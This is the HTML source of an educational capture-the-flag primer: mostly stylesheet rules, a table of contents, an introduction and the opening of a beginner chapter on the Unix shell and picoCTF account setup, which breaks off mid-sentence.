            margin-top: .25em;
            margin-bottom: .25em;
            display: inline-block;
            line-height: 0
        }

        .image.left {
            margin-right: .625em
        }

        .image.right {
            margin-left: .625em
        }

        a.image {
            text-decoration: none;
            display: inline-block
        }

        a.image object {
            pointer-events: none
        }

        sup.footnote,
        sup.footnoteref {
            font-size: .875em;
            position: static;
            vertical-align: super
        }

        sup.footnote a,
        sup.footnoteref a {
            text-decoration: none
        }

        sup.footnote a:active,
        sup.footnoteref a:active {
            text-decoration: underline
        }

        #footnotes {
            padding-top: .75em;
            padding-bottom: .75em;
            margin-bottom: .625em
        }

        #footnotes hr {
            width: 20%;
            min-width: 6.25em;
            margin: -.25em 0 .75em;
            border-width: 1px 0 0
        }

        #footnotes .footnote {
            padding: 0 .375em 0 .225em;
            line-height: 1.3334;
            font-size: .875em;
            margin-left: 1.2em;
            margin-bottom: .2em
        }

        #footnotes .footnote a:first-of-type {
            font-weight: bold;
            text-decoration: none;
            margin-left: -1.05em
        }

        #footnotes .footnote:last-of-type {
            margin-bottom: 0
        }

        #content #footnotes {
            margin-top: -.625em;
            margin-bottom: 0;
            padding: .75em 0
        }

        .gist .file-data>table {
            border: 0;
            background: #fff;
            width: 100%;
            margin-bottom: 0
        }

        .gist .file-data>table td.line-data {
            width: 99%
        }

        div.unbreakable {
            page-break-inside: avoid
        }

        .big {
            font-size: larger
        }

        .small {
            font-size: smaller
        }

        .underline {
            text-decoration: underline
        }

        .overline {
            text-decoration: overline
        }

        .line-through {
            text-decoration: line-through
        }

        .aqua {
            color: #00bfbf
        }

        .aqua-background {
            background: #00fafa
        }

        .black {
            color: #000
        }

        .black-background {
            background: #000
        }

        .blue {
            color: #0000bf
        }

        .blue-background {
            background: #0000fa
        }

        .fuchsia {
            color: #bf00bf
        }

        .fuchsia-background {
            background: #fa00fa
        }

        .gray {
            color: #606060
        }

        .gray-background {
            background: #7d7d7d
        }

        .green {
            color: #006000
        }

        .green-background {
            background: #007d00
        }

        .lime {
            color: #00bf00
        }

        .lime-background {
            background: #00fa00
        }

        .maroon {
            color: #600000
        }

        .maroon-background {
            background: #7d0000
        }

        .navy {
            color: #000060
        }

        .navy-background {
            background: #00007d
        }

        .olive {
            color: #606000
        }

        .olive-background {
            background: #7d7d00
        }

        .purple {
            color: #600060
        }

        .purple-background {
            background: #7d007d
        }

        .red {
            color: #bf0000
        }

        .red-background {
            background: #fa0000
        }

        .silver {
            color: #909090
        }

        .silver-background {
            background: #bcbcbc
        }

        .teal {
            color: #006060
        }

        .teal-background {
            background: #007d7d
        }

        .white {
            color: #bfbfbf
        }

        .white-background {
            background: #fafafa
        }

        .yellow {
            color: #bfbf00
        }

        .yellow-background {
            background: #fafa00
        }

        span.icon>.fa {
            cursor: default
        }

        a span.icon>.fa {
            cursor: inherit
        }

        .admonitionblock td.icon [class^="fa icon-"] {
            font-size: 2.5em;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, .5);
            cursor: default
        }

        .admonitionblock td.icon .icon-note::before {
            content: "\f05a";
            color: #19407c
        }

        .admonitionblock td.icon .icon-tip::before {
            content: "\f0eb";
            text-shadow: 1px 1px 2px rgba(155, 155, 0, .8);
            color: #111
        }

        .admonitionblock td.icon .icon-warning::before {
            content: "\f071";
            color: #bf6900
        }

        .admonitionblock td.icon .icon-caution::before {
            content: "\f06d";
            color: #bf3400
        }

        .admonitionblock td.icon .icon-important::before {
            content: "\f06a";
            color: #bf0000
        }

        .conum[data-value] {
            display: inline-block;
            color: #fff !important;
            background: rgba(0, 0, 0, .8);
            border-radius: 50%;
            text-align: center;
            font-size: .75em;
            width: 1.67em;
            height: 1.67em;
            line-height: 1.67em;
            font-family: "Open Sans", "DejaVu Sans", sans-serif;
            font-style: normal;
            font-weight: bold
        }

        .conum[data-value] * {
            color: #fff !important
        }

        .conum[data-value]+b {
            display: none
        }

        .conum[data-value]::after {
            content: attr(data-value)
        }

        pre .conum[data-value] {
            position: relative;
            top: -.125em
        }

        b.conum * {
            color: inherit !important
        }

        .conum:not([data-value]):empty {
            display: none
        }

        dt,
        th.tableblock,
        td.content,
        div.footnote {
            text-rendering: optimizeLegibility
        }

        h1,
        h2,
        p,
        td.content,
        span.alt,
        summary {
            letter-spacing: -.01em
        }

        p strong,
        td.content strong,
        div.footnote strong {
            letter-spacing: -.005em
        }

        p,
        blockquote,
        dt,
        td.content,
        span.alt,
        summary {
            font-size: 1.0625rem
        }

        p {
            margin-bottom: 1.25rem
        }

        .sidebarblock p,
        .sidebarblock dt,
        .sidebarblock td.content,
        p.tableblock {
            font-size: 1em
        }

        .exampleblock>.content {
            background: #fffef7;
            border-color: #e0e0dc;
            box-shadow: 0 1px 4px #e0e0dc
        }

        .print-only {
            display: none !important
        }

        @page {
            margin: 1.25cm .75cm
        }

        @media print {
            * {
                box-shadow: none !important;
                text-shadow: none !important
            }

            html {
                font-size: 80%
            }

            a {
                color: inherit !important;
                text-decoration: underline !important
            }

            a.bare,
            a[href^="#"],
            a[href^="mailto:"] {
                text-decoration: none !important
            }

            a[href^="http:"]:not(.bare)::after,
            a[href^="https:"]:not(.bare)::after {
                content: "(" attr(href) ")";
                display: inline-block;
                font-size: .875em;
                padding-left: .25em
            }

            abbr[title] {
                border-bottom: 1px dotted
            }

            abbr[title]::after {
                content: " (" attr(title) ")"
            }

            pre,
            blockquote,
            tr,
            img,
            object,
            svg {
                page-break-inside: avoid
            }

            thead {
                display: table-header-group
            }

            svg {
                max-width: 100%
            }

            p,
            blockquote,
            dt,
            td.content {
                font-size: 1em;
                orphans: 3;
                widows: 3
            }

            h2,
            h3,
            #toctitle,
            .sidebarblock>.content>.title {
                page-break-after: avoid
            }

            #header,
            #content,
            #footnotes,
            #footer {
                max-width: none
            }

            #toc,
            .sidebarblock,
            .exampleblock>.content {
                background: none !important
            }

            #toc {
                border-bottom: 1px solid #dddddf !important;
                padding-bottom: 0 !important
            }

            body.book #header {
                text-align: center
            }

            body.book #header>h1:first-child {
                border: 0 !important;
                margin: 2.5em 0 1em
            }

            body.book #header .details {
                border: 0 !important;
                display: block;
                padding: 0 !important
            }

            body.book #header .details span:first-child {
                margin-left: 0 !important
            }

            body.book #header .details br {
                display: block
            }

            body.book #header .details br+span::before {
                content: none !important
            }

            body.book #toc {
                border: 0 !important;
                text-align: left !important;
                padding: 0 !important;
                margin: 0 !important
            }

            body.book #toc,
            body.book #preamble,
            body.book h1.sect0,
            body.book .sect1>h2 {
                page-break-before: always
            }

            .listingblock code[data-lang]::before {
                display: block
            }

            #footer {
                padding: 0 .9375em
            }

            .hide-on-print {
                display: none !important
            }

            .print-only {
                display: block !important
            }

            .hide-for-print {
                display: none !important
            }

            .show-for-print {
                display: inherit !important
            }
        }

        @media amzn-kf8,
        print {
            #header>h1:first-child {
                margin-top: 1.25rem
            }

            .sect1 {
                padding: 0 !important
            }

            .sect1+.sect1 {
                border: 0
            }

            #footer {
                background: none
            }

            #footer-text {
                color: rgba(0, 0, 0, .6);
                font-size: .9em
            }
        }

        @media amzn-kf8 {

            #header,
            #content,
            #footnotes,
            #footer {
                padding: 0
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
        pre {
            line-height: 125%;
        }

        td.linenos .normal {
            color: inherit;
            background-color: transparent;
            padding-left: 5px;
            padding-right: 5px;
        }

        span.linenos {
            color: inherit;
            background-color: transparent;
            padding-left: 5px;
            padding-right: 5px;
        }

        td.linenos .special {
            color: #000000;
            background-color: #ffffc0;
            padding-left: 5px;
            padding-right: 5px;
        }

        span.linenos.special {
            color: #000000;
            background-color: #ffffc0;
            padding-left: 5px;
            padding-right: 5px;
        }

        pre.pygments .hll {
            background-color: #ffffcc
        }

        pre.pygments {
            background: #f8f8f8;
        }

        pre.pygments .tok-c {
            color: #008800;
            font-style: italic
        }

        /* Comment */
        pre.pygments .tok-err {
            border: 1px solid #FF0000
        }

        /* Error */
        pre.pygments .tok-k {
            color: #AA22FF;
            font-weight: bold
        }

        /* Keyword */
        pre.pygments .tok-o {
            color: #666666
        }

        /* Operator */
        pre.pygments .tok-ch {
            color: #008800;
            font-style: italic
        }

        /* Comment.Hashbang */
        pre.pygments .tok-cm {
            color: #008800;
            font-style: italic
        }

        /* Comment.Multiline */
        pre.pygments .tok-cp {
            color: #008800
        }

        /* Comment.Preproc */
        pre.pygments .tok-cpf {
            color: #008800;
            font-style: italic
        }

        /* Comment.PreprocFile */
        pre.pygments .tok-c1 {
            color: #008800;
            font-style: italic
        }

        /* Comment.Single */
        pre.pygments .tok-cs {
            color: #008800;
            font-weight: bold
        }

        /* Comment.Special */
        pre.pygments .tok-gd {
            color: #A00000
        }

        /* Generic.Deleted */
        pre.pygments .tok-ge {
            font-style: italic
        }

        /* Generic.Emph */
        pre.pygments .tok-gr {
            color: #FF0000
        }

        /* Generic.Error */
        pre.pygments .tok-gh {
            color: #000080;
            font-weight: bold
        }

        /* Generic.Heading */
        pre.pygments .tok-gi {
            color: #00A000
        }

        /* Generic.Inserted */
        pre.pygments .tok-go {
            color: #888888
        }

        /* Generic.Output */
        pre.pygments .tok-gp {
            color: #000080;
            font-weight: bold
        }

        /* Generic.Prompt */
        pre.pygments .tok-gs {
            font-weight: bold
        }

        /* Generic.Strong */
        pre.pygments .tok-gu {
            color: #800080;
            font-weight: bold
        }

        /* Generic.Subheading */
        pre.pygments .tok-gt {
            color: #0044DD
        }

        /* Generic.Traceback */
        pre.pygments .tok-kc {
            color: #AA22FF;
            font-weight: bold
        }

        /* Keyword.Constant */
        pre.pygments .tok-kd {
            color: #AA22FF;
            font-weight: bold
        }

        /* Keyword.Declaration */
        pre.pygments .tok-kn {
            color: #AA22FF;
            font-weight: bold
        }

        /* Keyword.Namespace */
        pre.pygments .tok-kp {
            color: #AA22FF
        }

        /* Keyword.Pseudo */
        pre.pygments .tok-kr {
            color: #AA22FF;
            font-weight: bold
        }

        /* Keyword.Reserved */
        pre.pygments .tok-kt {
            color: #00BB00;
            font-weight: bold
        }

        /* Keyword.Type */
        pre.pygments .tok-m {
            color: #666666
        }

        /* Literal.Number */
        pre.pygments .tok-s {
            color: #BB4444
        }

        /* Literal.String */
        pre.pygments .tok-na {
            color: #BB4444
        }

        /* Name.Attribute */
        pre.pygments .tok-nb {
            color: #AA22FF
        }

        /* Name.Builtin */
        pre.pygments .tok-nc {
            color: #0000FF
        }

        /* Name.Class */
        pre.pygments .tok-no {
            color: #880000
        }

        /* Name.Constant */
        pre.pygments .tok-nd {
            color: #AA22FF
        }

        /* Name.Decorator */
        pre.pygments .tok-ni {
            color: #999999;
            font-weight: bold
        }

        /* Name.Entity */
        pre.pygments .tok-ne {
            color: #D2413A;
            font-weight: bold
        }

        /* Name.Exception */
        pre.pygments .tok-nf {
            color: #00A000
        }

        /* Name.Function */
        pre.pygments .tok-nl {
            color: #A0A000
        }

        /* Name.Label */
        pre.pygments .tok-nn {
            color: #0000FF;
            font-weight: bold
        }

        /* Name.Namespace */
        pre.pygments .tok-nt {
            color: #008000;
            font-weight: bold
        }

        /* Name.Tag */
        pre.pygments .tok-nv {
            color: #B8860B
        }

        /* Name.Variable */
        pre.pygments .tok-ow {
            color: #AA22FF;
            font-weight: bold
        }

        /* Operator.Word */
        pre.pygments .tok-w {
            color: #bbbbbb
        }

        /* Text.Whitespace */
        pre.pygments .tok-mb {
            color: #666666
        }

        /* Literal.Number.Bin */
        pre.pygments .tok-mf {
            color: #666666
        }

        /* Literal.Number.Float */
        pre.pygments .tok-mh {
            color: #666666
        }

        /* Literal.Number.Hex */
        pre.pygments .tok-mi {
            color: #666666
        }

        /* Literal.Number.Integer */
        pre.pygments .tok-mo {
            color: #666666
        }

        /* Literal.Number.Oct */
        pre.pygments .tok-sa {
            color: #BB4444
        }

        /* Literal.String.Affix */
        pre.pygments .tok-sb {
            color: #BB4444
        }

        /* Literal.String.Backtick */
        pre.pygments .tok-sc {
            color: #BB4444
        }

        /* Literal.String.Char */
        pre.pygments .tok-dl {
            color: #BB4444
        }

        /* Literal.String.Delimiter */
        pre.pygments .tok-sd {
            color: #BB4444;
            font-style: italic
        }

        /* Literal.String.Doc */
        pre.pygments .tok-s2 {
            color: #BB4444
        }

        /* Literal.String.Double */
        pre.pygments .tok-se {
            color: #BB6622;
            font-weight: bold
        }

        /* Literal.String.Escape */
        pre.pygments .tok-sh {
            color: #BB4444
        }

        /* Literal.String.Heredoc */
        pre.pygments .tok-si {
            color: #BB6688;
            font-weight: bold
        }

        /* Literal.String.Interpol */
        pre.pygments .tok-sx {
            color: #008000
        }

        /* Literal.String.Other */
        pre.pygments .tok-sr {
            color: #BB6688
        }

        /* Literal.String.Regex */
        pre.pygments .tok-s1 {
            color: #BB4444
        }

        /* Literal.String.Single */
        pre.pygments .tok-ss {
            color: #B8860B
        }

        /* Literal.String.Symbol */
        pre.pygments .tok-bp {
            color: #AA22FF
        }

        /* Name.Builtin.Pseudo */
        pre.pygments .tok-fm {
            color: #00A000
        }

        /* Name.Function.Magic */
        pre.pygments .tok-vc {
            color: #B8860B
        }

        /* Name.Variable.Class */
        pre.pygments .tok-vg {
            color: #B8860B
        }

        /* Name.Variable.Global */
        pre.pygments .tok-vi {
            color: #B8860B
        }

        /* Name.Variable.Instance */
        pre.pygments .tok-vm {
            color: #B8860B
        }

        /* Name.Variable.Magic */
        pre.pygments .tok-il {
            color: #666666
        }

        /* Literal.Number.Integer.Long */
    </style>
</head>

<body class="article toc2 toc-left">
    <div id="header">
        <h1>The CTF Primer</h1>
        <div class="details">
            <span id="author" class="author">Samuel Sabogal Pardo, et al.</span><br>
        </div>
        <div id="toc" class="toc2">
            <div id="toctitle">Table of Contents</div>
            <ul class="sectlevel1">
                <li><a href="#_introduction">1. Introduction</a></li>
                <li><a href="#_the_shell">2. The Shell</a>
                    <ul class="sectlevel2">
                        <li><a href="#_symbol_of_the_hacker">2.1. Symbol of the Hacker</a></li>
                        <li><a href="#_got_shell">2.2. Got Shell?</a></li>
                        <li><a href="#_get_a_shell">2.3. Get a Shell</a></li>
                        <li><a href="#_gui_fu_to_shell_fu">2.4. GUI-fu to Shell-fu</a></li>
                        <li><a href="#_what_the_shell">2.5. What the Shell!?</a></li>
                        <li><a href="#_conclusion">2.6. Conclusion</a></li>
                    </ul>
                </li>
                <li><a href="#_forensics">3. Forensics</a>
                    <ul class="sectlevel2">
                        <li><a href="#_what_is_forensics">3.1. What is Forensics?</a></li>
                        <li><a href="#_how_to_search_for_strings_and_filenames">3.2. How to search for strings and
                                filenames</a></li>
                        <li><a href="#_disk_analysis">3.3. Disk analysis</a></li>
                        <li><a href="#_packet_analysis">3.4. Packet analysis</a></li>
                    </ul>
                </li>
                <li><a href="#_programming_in_python">4. Programming in python</a>
                    <ul class="sectlevel2">
                        <li><a href="#_lists">4.1. Lists</a></li>
                        <li><a href="#_functions">4.2. Functions</a></li>
                        <li><a href="#_input_and_output">4.3. Input and output</a></li>
                        <li><a href="#_comments">4.4. Comments</a></li>
                        <li><a href="#_try_except_and_exceptions">4.5. Try-except and exceptions</a></li>
                        <li><a href="#_pass_arguments_to_a_python_program">4.6. Pass arguments to a python program</a>
                        </li>
                        <li><a href="#_ascii">4.7. ASCII</a></li>
                        <li><a href="#_pwntools">4.8. Pwntools</a></li>
                        <li><a href="#_http_requests_in_python">4.9. Http requests in python</a></li>
                    </ul>
                </li>
                <li><a href="#_web_exploits">5. Web Exploits</a>
                    <ul class="sectlevel2">
                        <li><a href="#_html">5.1. Html</a></li>
                        <li><a href="#_javascript">5.2. JavaScript</a></li>
                        <li><a href="#_server_code">5.3. Server code</a></li>
                        <li><a href="#_cross_site_scripting_xss">5.4. Cross Site Scripting (XSS)</a></li>
                    </ul>
                </li>
                <li><a href="#_cryptography">6. Cryptography</a>
                    <ul class="sectlevel2">
                        <li><a href="#_practical_example">6.1. Practical example</a></li>
                        <li><a href="#_substitution_ciphers">6.2. Substitution ciphers</a></li>
                        <li><a href="#_transposition_ciphers">6.3. Transposition ciphers</a></li>
                        <li><a href="#_key_ciphers">6.4. Key ciphers</a></li>
                        <li><a href="#_modern_cryptography">6.5. Modern cryptography</a></li>
                    </ul>
                </li>
                <li><a href="#_the_network">7. The Network</a>
                    <ul class="sectlevel2">
                        <li><a href="#_sniffing_and_attack_example">7.1. Sniffing and attack example</a></li>
                    </ul>
                </li>
                <li><a href="#_infiltrating_in_a_database">8. Infiltrating in a database</a>
                    <ul class="sectlevel2">
                        <li><a href="#_sql">8.1. SQL</a></li>
                        <li><a href="#_basic_sql_injection">8.2. Basic SQL injection</a></li>
                        <li><a href="#_blind_sql_injection">8.3. Blind SQL injection</a></li>
                    </ul>
                </li>
                <li><a href="#_a_little_about_c_language">9. A little about C language</a>
                    <ul class="sectlevel2">
                        <li><a href="#_some_c_features">9.1. Some C features</a></li>
                        <li><a href="#_c_hello_world">9.2. C Hello World!</a></li>
                        <li><a href="#_c_data_types">9.3. C data types</a></li>
                        <li><a href="#_c_pointers">9.4. C pointers</a></li>
                    </ul>
                </li>
                <li><a href="#_binary_exploitation">10. Binary Exploitation</a>
                    <ul class="sectlevel2">
                        <li><a href="#_a_hack_example">10.1. A hack example!</a></li>
                        <li><a href="#_stack_overflow_attack">10.2. Stack overflow attack</a></li>
                        <li><a href="#_what_you_need_to_know_for_a_binary_exploit">10.3. What you need to know for a
                                binary exploit</a></li>
                        <li><a href="#_example_of_execution_of_a_program">10.4. Example of Execution of a program</a>
                        </li>
                    </ul>
                </li>
                <li><a href="#_assembly">11. Assembly</a>
                    <ul class="sectlevel2">
                        <li><a href="#_registers">11.1. Registers</a></li>
                        <li><a href="#_general_registers">11.2. General Registers</a></li>
                        <li><a href="#_indexpointer_registers">11.3. Index/Pointer Registers</a></li>
                        <li><a href="#_assembly_example">11.4. Assembly example</a></li>
                    </ul>
                </li>
                <li><a href="#_careers">Appendix A: Careers</a>
                    <ul class="sectlevel2">
                        <li><a href="#_bug_bounties">A.1. Bug Bounties</a></li>
                        <li><a href="#_the_cve_program">A.2. The CVE Program</a></li>
                        <li><a href="#_ethical_considerations">A.3. Ethical Considerations</a></li>
                    </ul>
                </li>
                <li><a href="#_virtual_environment">Appendix B: Virtual Environment</a>
                    <ul class="sectlevel2">
                        <li><a href="#_web">B.1. Web</a></li>
                        <li><a href="#_virtual_machines">B.2. Virtual Machines</a></li>
                        <li><a href="#_vpns">B.3. VPNs</a></li>
                        <li><a href="#_authentication">B.4. Authentication</a></li>
                        <li><a href="#_ides">B.5. IDEs</a></li>
                        <li><a href="#_installations">B.6. Installations</a></li>
                    </ul>
                </li>
                <li><a href="#_git_version_control">Appendix C: Git &amp; Version Control</a>
                    <ul class="sectlevel2">
                        <li><a href="#_git_started_with_git">C.1. 'Git' Started with Git</a></li>
                        <li><a href="#_branching">C.2. Branching</a></li>
                        <li><a href="#_merging">C.3. Merging</a></li>
                        <li><a href="#_pulling_pushing">C.4. Pulling &amp; Pushing</a></li>
                        <li><a href="#_review_of_git">C.5. Review of Git</a></li>
                        <li><a href="#_using_github">C.6. Using GitHub</a></li>
                    </ul>
                </li>
                <li><a href="#_tools">Appendix D: Tools</a>
                    <ul class="sectlevel2">
                        <li><a href="#_general">D.1. General</a></li>
                        <li><a href="#_forensics_2">D.2. Forensics</a></li>
                        <li><a href="#_web_exploitation">D.3. Web Exploitation</a></li>
                        <li><a href="#_cryptography_2">D.4. Cryptography</a></li>
                        <li><a href="#_databases">D.5. Databases</a></li>
                        <li><a href="#_assembly_2">D.6. Assembly</a></li>
                        <li><a href="#_git">D.7. Git</a></li>
                    </ul>
                </li>
            </ul>
        </div>
    </div>
    <div id="content">
        <div class="sect1">
            <h2 id="_introduction">1. Introduction</h2>
            <div class="sectionbody">
                <div class="paragraph">
                    <p>You are going to have real fun here. And, you will gain the ability to do impressive things in
                        life using a computer. It will be like acquiring a superpower to be able to do things that
                        ordinary people cannot do. Lets see how that is possible.</p>
                </div>
                <div class="paragraph">
                    <p>A common mobile device, the one you might have in your hands right now, can have 100,000 times
                        more computing power than the computer used to send humans to the moon for the first time. There
                        are 7.7 billion humans; did you know that by 2020 there will be more than 30 billion devices
                        connected to the Internet? Imagine all that power&#8230;&#8203; you could do many unprecedented
                        things with only a little part of it, and that power keeps growing everyday&#8230;&#8203;</p>
                </div>
                <div class="paragraph">
                    <p>Our world depends on computers. Imagine the apocalyptic catastrophe if computers ceased to work:
                        money in banks is inaccessible, all telecommunications die, airports cease functioning and
                        commercial airliners would fall from the sky, energy distribution systems become uncontrollable,
                        hospitals and critical life support systems would irrevocably fail, and our society would
                        collapse. In 1988, a single person, without bad intentions, took down all the Internet with just
                        one malicious program, known as the Morris Worm. Society was different at that time so it was
                        not as catastrophic as it would have been now. But, why we have not collapsed yet?</p>
                </div>
                <div class="paragraph">
                    <p>The only way to overcome a weakness is to first know that it exists. Hackers find weaknesses in
                        the computer world. The word hacker has had several definitions throughout history. In a
                        dictionary, we can find two related definitions:</p>
                </div>
                <div class="olist arabic">
                    <ol class="arabic">
                        <li>
                            <p>An expert at programming and solving problems with a computer</p>
                        </li>
                        <li>
                            <p>A person who illegally gains access to and sometimes tampers with information in a
                                computer system</p>
                        </li>
                    </ol>
                </div>
                <div class="paragraph">
                    <p>We are going to take a little from both definitions, but we will gain access and tamper with
                        information for good. In other words, a skill can be used for malicious purposes or, to become
                        the real-life hero that manipulates technology at will, keeping the planes in the sky, and
                        society out of collapse. That sounds romantic, but you will realize that just the mere fact of
                        making your computer make something awesome, and getting a secret flag generates emotions and
                        adrenaline. Come with us on this journey to become a real hacker!</p>
                </div>
            </div>
        </div>
        <div class="sect1">
            <h2 id="_the_shell">2. The Shell</h2>
            <div class="sectionbody">
                <h5 id="shl" class="discrete">Luke Jones</h5>
                <div class="paragraph">
                    <p></p>
                </div>
                <hr>
                <div class="paragraph">
                    <p>The Shell is foundational to so many parts of securing computing devices and
                        their networks. Intimidating and alluring (like most symbols enshrined by film
                        makers), understanding the shell can make or break one&#8217;s ability to solve
                        challenges in a capture-the-flag competition like picoCTF.</p>
                </div>
                <div class="paragraph">
                    <p>To be transparent, I (LT) am still learning a lot about the shell, and I&#8217;m
                        just about 10 years into it right now! This is an encouragement - anyone
                        curious enough to jump into rabbit holes here and there is always going to have
                        opportunities to learn more about an amazing tool like the shell. But rest
                        assured, I was proficient in the shell long ago and it does not take very much
                        time before the shell starts working for <strong>you</strong>.</p>
                </div>
                <div class="paragraph">
                    <p>Next up, what is that mystique unique to the hacker and their shell?</p>
                </div>
                <div class="sect2">
                    <h3 id="_symbol_of_the_hacker">2.1. Symbol of the Hacker</h3>
                    <div id="shl-symbol-of-the-hacker" class="paragraph">
                        <p>A blank, black screen and blinking cursor. Lines and lines of scrolling text
                            and someone in front of that screen who seemingly understands an
                            incomprehensible flow of information. That is the shell.</p>
                    </div>
                    <div class="paragraph">
                        <p>The shell has many other names: the terminal, the command prompt, bash&#8230;&#8203;
                            PowerShell, if you&#8217;re looking at Windows and feeling blue. Each name has its
                            own nuances. But that doesn&#8217;t matter right now. What matters is that there is
                            the interface to computing devices that nearly all people use, and then there
                            is the shell.</p>
                    </div>
                    <div class="paragraph">
                        <p>If you&#8217;ve come here to get a shell and don&#8217;t care for much else, then you
                            should skip to the <a href="#shl-get-a-shell">Get a Shell</a> section. Be warned that the
                            shell is more powerful than the usual way of interacting with a device.
                            Deleting files is permanent in the shell, any file can be accessed at any
                            moment in the shell, and hopefully it&#8217;s not farfetched to assert that those
                            two things are a dangerous combination.</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_got_shell">2.2. Got Shell?</h3>
                    <div id="shl-got-shell" class="paragraph">
                        <p>Using a computer or smart device happens in 1 of 2 ways:</p>
                    </div>
                    <div class="olist arabic">
                        <ol class="arabic">
                            <li>
                                <p>Using a pointer such as a mouse, touchpad or finger to select apps, files,
                                    or buttons</p>
                            </li>
                            <li>
                                <p>Using keys on a keyboard to enter simple or complex commands (the Shell)</p>
                            </li>
                        </ol>
                    </div>
                    <div class="paragraph">
                        <p>Thankfully, there are TLA&#8217;s (Three Letter Acronyms) for both methods
                            described above:</p>
                    </div>
                    <div class="olist arabic">
                        <ol class="arabic">
                            <li>
                                <p>GUI. Pronounced "gooey," stands for Graphical User Interface</p>
                            </li>
                            <li>
                                <p>CLI. Sounded out: "See-El-Eye," stands for Command Line Interface</p>
                            </li>
                        </ol>
                    </div>
                    <div class="paragraph">
                        <p>These acronyms are pretty good as far as acronyms go. We will refer to the
                            shell by many names, perhaps sometimes even by the CLI initialism. The GUI
                            doesn&#8217;t have as nice of a name as the shell, so we will probably use GUI to
                            briefly refer to the interface that everyone knows about on computing devices
                            that is driven by a pointer on a screen.</p>
                    </div>
                    <div class="paragraph">
                        <p>Below is a screenshot of a shell after successful login and before the user has
                            typed in any commands:</p>
                    </div>
                    <div id="first-look" class="imageblock text-center">
                        <div class="content">
                            <img src="images/shl-1-first-look-shell.png" alt="shl 1 first look shell">
                        </div>
                        <div class="title">Figure 1. The shell waiting for a command</div>
                    </div>
                    <div class="paragraph">
                        <p>In the picture above, there is a lot of empty space, and even the line of text
                            that exists, does not provide a lot of clarity. The situation is simpler than
                            how it looks. There are only 3 pieces of information in the screenshot above,
                            and you would likely recognize at least one of them if it were <strong>you</strong> who
                            logged
                            on:</p>
                    </div>
                    <div class="paragraph">
                        <p>From left to right in the shell command line prompt:</p>
                    </div>
                    <div class="olist arabic">
                        <ol class="arabic">
                            <li>
                                <p>What does <code>Q0h313th</code> mean?</p>
                                <div class="ulist">
                                    <ul>
                                        <li>
                                            <p>Answer: <a
                                                    href="https://gist.github.com/syreal17/a000b3ac491b80bfabb6ab80491b66e5"
                                                    class="bare">https://gist.github.com/syreal17/a000b3ac491b80bfabb6ab80491b66e5</a>
                                            </p>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li>
                                <p>What does <code>pico-2019-shell1</code> mean?</p>
                                <div class="ulist">
                                    <ul>
                                        <li>
                                            <p>Answer: <a
                                                    href="https://gist.github.com/syreal17/2152a545457f7f83a11006139e5a04f1"
                                                    class="bare">https://gist.github.com/syreal17/2152a545457f7f83a11006139e5a04f1</a>
                                            </p>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li>
                                <p>What does <code>~</code> mean?</p>
                                <div class="ulist">
                                    <ul>
                                        <li>
                                            <p>Answer: <a
                                                    href="https://gist.github.com/syreal17/8b4bdf7bd0b35a7196b73c02c31c0ec2"
                                                    class="bare">https://gist.github.com/syreal17/8b4bdf7bd0b35a7196b73c02c31c0ec2</a>
                                            </p>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                            <li>
                                <p>What does <code>$</code> mean?</p>
                                <div class="ulist">
                                    <ul>
                                        <li>
                                            <p>Answer: <a
                                                    href="https://gist.github.com/syreal17/dc1340fef44be3dc59819e3379c3fe28"
                                                    class="bare">https://gist.github.com/syreal17/dc1340fef44be3dc59819e3379c3fe28</a>
                                            </p>
                                        </li>
                                    </ul>
                                </div>
                            </li>
                        </ol>
                    </div>
                    <div class="paragraph">
                        <p>In terms of raw power, Q0h313th could delete every file they own on this
                            machine with one command. That&#8217;s almost never desirable, and I will wait to
                            show this command until there is something useful and desirable to do with it.
                            In terms of useful power, Q0h313th could create a copy of an entire website for
                            use when there is no accessible WiFi. That&#8217;s using the command <code>wget</code>.</p>
                    </div>
                    <div class="paragraph">
                        <p>Now let&#8217;s talk about <strong>getting</strong> a shell!</p>
                    </div>
                </div>
                <div class="sect2">
                    <h3 id="_get_a_shell">2.3. Get a Shell</h3>
                    <div id="shl-get-a-shell" class="paragraph">
                        <p>Cybersecurity is a topic that is most deeply learned by listening <strong>and</strong> doing.
                            For this reason, I advise you to create a picoCTF account at this point if
                            you have not already. Beyond providing 120+ security challenges in helpful
                            learning ramps, every picoCTF account gets access to a web-based Linux <em>shell</em>.</p>
                    </div>
                    <div class="paragraph">
                        <p>A note on the structure of my (LT&#8217;s) chapters: many times I will provide a high
                            level tutorial for a task and also a step by step walkthrough for the same
                            task. This is my attempt at accommodating different learning styles and,
                            different levels of experience. Typically, the high-level walkthrough is more
                            for learners who already know the basics but need a refresher or need a
                            reminder about the particulars when it comes to this Primer. The step by step
                            walkthrough is more for learners who have never ventured in a particular task
                            before. Of course, you must choose your own path here, but the safest bet may
                            be to read the high-level walkthrough but actually put hands to keyboard for
                            the step by step walkthrough.</p>
                    </div>
                    <div class="sect3">
                        <h4 id="_high_level_tutorial">2.3.1. High level tutorial</h4>
                        <div class="olist arabic">
                            <ol class="arabic">
                                <li>
                                    <p><strong>Gain access to a practice shell</strong></p>
                                    <div class="olist loweralpha">
                                        <ol class="loweralpha" type="a">
                                            <li>
                                                <p>Register for a picoCTF account</p>
                                                <div class="ulist">
                                                    <ul>
                                                        <li>
                                                            <p>Click link in email that is sent to registered email
                                                                address</p>
                                                            <div class="olist lowerroman">
                                                                <ol class="lowerroman" type="i">
                                                                    <li>
                                                                        <p>Log in to the picoCTF webshell</p>
                                                                    </li>
                                                                </ol>
                                                            </div>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </li>
                                        </ol>
                                    </div>
                                </li>
                            </ol>
                        </div>
                    </div>
                    <div class="sect3">
                        <h4 id="_step_by_step_walkthrough">2.3.2. Step by Step Walkthrough</h4>
                        <div class="paragraph">
                            <p><strong>Register for a picoCTF account at the link below.</strong> You will need to
                                validate the email address you provide by clicking on a link that is sent to
                                it.</p>
                        </div>
                        <div class="paragraph">
                            <p><a href="https://play.picoctf.org/" class="bare">https://play.picoctf.org/</a></p>
                        </div>
                        <div class="paragraph">
                            <p>After successfully registering, a web shell can be accessed at the URL below.
                                <strong>Use the same user name and password that you registered on the picoCTF
